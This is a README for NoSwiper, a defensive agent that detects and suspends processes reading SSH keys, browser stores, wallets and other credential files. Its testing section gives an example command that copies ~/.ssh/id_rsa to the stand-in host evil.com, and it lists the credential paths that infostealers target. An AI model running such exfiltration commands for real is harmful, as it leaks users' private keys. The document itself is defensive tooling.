# NoSwiper - Advanced Credential Protection Agent

NoSwiper is a sophisticated credential protection agent that monitors and blocks unauthorized access to sensitive files, protecting against credential theft and infostealer malware.

## Features

- **Real-time monitoring** of file access and command execution
- **Advanced rule system** with flexible AND/OR logic for access control
- **Team ID verification** (macOS) - distinguishes Apple-assigned IDs from spoofable signing IDs
- **Parent process tracking** - automatically stops both violating process and parent
- **Command-line argument scanning** - detects credentials passed as arguments
- **Cross-platform support**:
  - macOS: Uses `eslogger` for real-time monitoring
  - Linux: `fanotify` support with kernel-level blocking
  - FreeBSD/NetBSD: DTrace-based monitoring
  - OpenSolaris/illumos: Native DTrace support
- **Comprehensive protection** against infostealers targeting:
  - SSH keys and cloud credentials
  - Browser password stores (Chrome, Firefox, Safari, Zen, etc.)
  - Email clients (Mail, Outlook, Thunderbird, Spark)
  - Cryptocurrency wallets
  - Password managers (1Password, Bitwarden, KeePass, etc.)
  - Communication apps (Discord, Slack, Signal, Telegram)
  - Development tools (Git, Docker, Kubernetes)

## Prerequisites

### macOS
- macOS 11+ (for `eslogger`)
- SIP can remain enabled (no special entitlements required)

### Linux
- Kernel 2.6.37+ (for fanotify support)
- Root privileges (required for fanotify)

### BSD/Solaris
- DTrace support enabled in kernel
- Root privileges

### All Platforms
- Rust 1.70+ (for building from source)
- Root/administrator privileges (required for monitoring)

## Building

```bash
git clone <repository-url>
cd noswiper
cargo build --release
```

## Installation

```bash
# Copy binary to system location
sudo cp target/release/noswiper-agent /usr/local/bin/

# macOS: The agent uses unified logging
# Linux: The agent logs to systemd journal
# BSD/Solaris: Standard syslog
```

## Usage

### Basic Usage

```bash
# Default: Enforce mode (block and suspend unauthorized access)
sudo noswiper-agent

# Monitor mode (log only, no blocking)
sudo noswiper-agent --monitor

# Interactive mode (prompt user for decisions)
sudo noswiper-agent --interactive

# Verbose mode (show all file access, not just protected files)
sudo noswiper-agent --verbose
```

### Command Line Options

```bash
noswiper-agent [OPTIONS]

Options:
  --monitor        Monitor-only mode (log access attempts but don't block)
  --interactive    Interactive mode (prompt user via CLI for decisions)
  --verbose        Show all file opens, not just protected files
  --stop-parent    Also stop parent process when stopping violator [default: true]
  --mechanism      Monitoring mechanism:
                   - auto: Automatically select best available
                   - eslogger: macOS only, uses eslogger command
                   - fanotify: Linux only, kernel-level blocking
                   - dtrace: BSD/Solaris, DTrace-based monitoring
  --log-level      Log level: debug, info, warn, error [default: info]
  --show-config    Show current configuration and exit
  --help           Print help
  --version        Print version
```

### Testing the Agent

1. **Start in monitor mode** (recommended for initial testing):
   ```bash
   sudo noswiper-agent --monitor --verbose
   ```

2. **Try accessing protected files**:
   ```bash
   # In another terminal, try to access SSH keys
   cat ~/.ssh/id_rsa

   # Or try to pass protected paths as arguments
   scp ~/.ssh/id_rsa user@evil.com:/tmp/
   ```

3. **Check the logs** to see detection in action.

### Example Output

```
[2024-01-20 10:15:23] [INFO] NoSwiper agent starting
[2024-01-20 10:15:23] [INFO] Version: 0.1.0
[2024-01-20 10:15:23] [INFO] Mode: enforce
[2024-01-20 10:15:23] [INFO] Monitoring file access with eslogger...
[2024-01-20 10:15:45] [ERROR] /usr/bin/curl[12345/ppid:5678]: open /Users/alice/.ssh/id_rsa: STOPPED + parent[5678]
[2024-01-20 10:15:45] [WARN] /usr/bin/python3[23456/ppid:1]: exec with ~/.aws/credentials: DETECTED
```

## Configuration System

NoSwiper uses a sophisticated rule system embedded at compile time. Rules use flexible AND/OR logic:

### Rule Structure

```yaml
protected_files:
  - pattern: "~/.ssh/id_*"
    allow:
      # Each item in this list is OR'd
      - basename: "ssh"             # AND conditions within each rule
        path_pattern: "/usr/bin/*"

      - team_id: "com.apple.Terminal"  # Apple-assigned Team ID (secure)
        ppid: 1                         # Parent PID must be launchd

      - path_pattern: "/Applications/*/*.app/Contents/MacOS/*"
        ppid: 1  # Any app from /Applications launched by launchd
```

### Rule Fields

- **`basename`**: Process name (e.g., "ssh", "git")
- **`path_pattern`**: Full path with wildcards (e.g., "/usr/bin/*")
- **`team_id`**: Apple-assigned Team ID (secure, cannot be spoofed)
- **`signing_id`**: Developer-set signing ID (less secure)
- **`ppid`**: Parent process ID (1 = launchd on macOS)
- **`args_pattern`**: Command-line arguments pattern
- **`uid`**: User ID (for system processes)

### Security Principles

1. **GUI apps require ppid=1**: All macOS GUI applications must be launched by launchd
2. **CLI tools need specific paths**: Command-line tools must be from `/usr/bin`, `/usr/local/bin`, or `/opt/homebrew/bin`
3. **Team ID over Signing ID**: Uses secure Apple-assigned Team IDs where possible
4. **No global trust**: Each protected file explicitly lists its allowed accessors

## Protected Resources

### Credentials & Keys
- **SSH**: `~/.ssh/id_*`, `~/.ssh/*_key`
- **Cloud**: AWS, GCP, Azure credentials
- **GPG**: `~/.gnupg/private-keys*`, `~/.gnupg/secring.gpg`
- **Package Managers**: npm, pip, cargo, docker tokens

### Browser Data
- **Chrome/Chromium**: Login Data, Cookies, Web Data
- **Firefox**: `logins.json`, `key*.db`, `cookies.sqlite`
- **Safari**: LocalStorage, Databases
- **Zen Browser**: Full profile protection

### Communication Apps
- **Discord**: `~/Library/Application Support/discord/Local Storage/`
- **Slack**: Cookies and Local Storage
- **Signal**: `sql/db.sqlite`, `config.json`
- **Telegram**: `tdata/*`

### macOS Keychain
Special handling for `~/Library/Keychains/login.keychain-db`:
- Allows all Apple system processes
- Allows any app from `/Applications` with ppid=1
- Requires specific team IDs for third-party tools

### Email Clients
- **Mail.app**: `~/Library/Mail/`, `Accounts.plist`
- **Outlook**: Profile data and messages
- **Thunderbird**: Full profile protection

### Password Managers
- **1Password**, **Bitwarden**, **KeePass**, **LastPass**
- Protected by specific Team IDs

### Cryptocurrency Wallets
- **Bitcoin**: `wallet.dat`
- **Ethereum**: `keystore/*`
- **Electrum**, **Exodus**, **Atomic Wallet**

## Logging

### macOS
```bash
# View logs using unified logging
log show --predicate 'process == "noswiper-agent"' --last 1h

# Stream logs
log stream --predicate 'process == "noswiper-agent"'
```

### Linux
```bash
# View systemd journal logs
journalctl -u noswiper -f

# View with timestamps
journalctl -u noswiper --since "1 hour ago"
```

### BSD/Solaris
```bash
# View syslog
tail -f /var/log/messages | grep noswiper
```

## Process Handling

### Enforce Mode (Default)
- **Immediately suspends** violating process with SIGSTOP
- **Suspends parent process** if `--stop-parent` is enabled (default)
- Processes remain suspended (can be resumed with `kill -CONT <pid>`)

### Monitor Mode
- Logs all violations but takes no action
- Useful for testing and understanding normal system behavior

### Interactive Mode
- Suspends process temporarily
- Prompts user for decision via CLI
- Can whitelist applications for specific credentials

## Security Model

- **Defense in depth**: Multiple layers of verification
- **Fail closed**: Deny access when uncertain
- **Path verification**: Executables must be in legitimate locations
- **Code signature verification**: Validates Team IDs on macOS
- **Parent process validation**: GUI apps must be launched by launchd (ppid=1)
- **Command argument scanning**: Detects credentials in command lines

## Platform Support

### macOS (Primary)
- Full support via `eslogger`
- Team ID and code signature verification
- Process suspension via SIGSTOP

### Linux
- Kernel-level blocking via `fanotify`
- Real access prevention (not just detection)
- Package manager verification

### FreeBSD/NetBSD
- DTrace-based monitoring
- Process suspension support
- kqueue support planned

### OpenSolaris/illumos
- Native DTrace (most mature implementation)
- Full monitoring capabilities

## Limitations

### Current Version
- **No custom configuration**: Rules are compiled into binary
- **No GUI**: Command-line only
- **macOS**: Cannot truly prevent file reads (only suspend process)
- **Limited runtime exceptions**: 5-minute whitelist via interactive mode

### Not Protected Against
- Kernel-level rootkits
- Direct memory access attacks
- Processes running before agent starts
- System binaries (to prevent system breakage)

## Future Roadmap

- [ ] GUI application for desktop users
- [ ] User-editable configuration files
- [ ] Endpoint Security Framework support (macOS)
- [ ] eBPF support for modern Linux kernels
- [ ] Machine learning for anomaly detection
- [ ] Centralized management for enterprise

## Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit changes (`git commit -m 'Add amazing feature'`)
4. Push to branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## Security Reporting

Found a security issue? Please email security@<domain> instead of using the issue tracker.

## License

Licensed under either of:
- Apache License, Version 2.0 ([LICENSE-APACHE](LICENSE-APACHE))
- MIT License ([LICENSE-MIT](LICENSE-MIT))

at your option.

## Acknowledgments

- Apple's Endpoint Security Framework documentation
- The Rust community for excellent system programming support
- DTrace community for cross-platform tracing tools